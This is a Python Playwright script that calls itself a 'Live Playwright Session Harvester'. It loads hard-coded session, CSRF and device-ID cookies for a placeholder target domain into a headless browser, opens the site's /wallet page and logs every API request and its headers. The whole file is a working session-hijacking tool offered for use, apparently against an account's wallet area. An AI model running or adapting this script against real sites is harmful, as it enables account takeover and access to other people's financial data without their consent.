import asyncio
from playwright.async_api import async_playwright

async def harvest_live_session():
    print("[*] Initializing Live Playwright Session Harvester...")
    
    async with async_playwright() as p:
        # Launch browser (set headless=False if you want to watch it click around!)
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        
        # Inject SEAT Cookies
        cookies = [
            {
                "name": "ISTIO_AUTH_SESSION_ID",
                "value": "082e749710ab5df7",
                "domain": "yourtarget.com",
                "path": "/",
                "secure": False,
                "httpOnly": True
            },
            {
                "name": "csrf",
                "value": "oO5i5JNdGnLNsjbx",
                "domain": ".yourtarget.com",
                "path": "/",
                "secure": True,
                "httpOnly": True
            },
            {
                "name": "d_id",
                "value": "1adf556bc330374a",
                "domain": ".yourtarget.com",
                "path": "/",
                "secure": True,
                "httpOnly": True
            }
        ]
        
        await context.add_cookies(cookies)
        page = await context.new_page()
        
        # Intercept and log all outgoing requests and headers
        page.on("request", lambda req: print(f"    [LIVE REQ] {req.method} -> {req.url}\n        Headers: {req.headers}\n") if "api" in req.url else None)
        
        print("[+] Navigating to https://yourtarget.com/wallet ...")
        await page.goto("https://yourtarget.com/wallet", timeout=40000)
        await asyncio.sleep(8)
        
        print("[*] Live harvest complete. Closing browser.")
        await browser.close()

if __name__ == "__main__":
    asyncio.run(harvest_live_session())
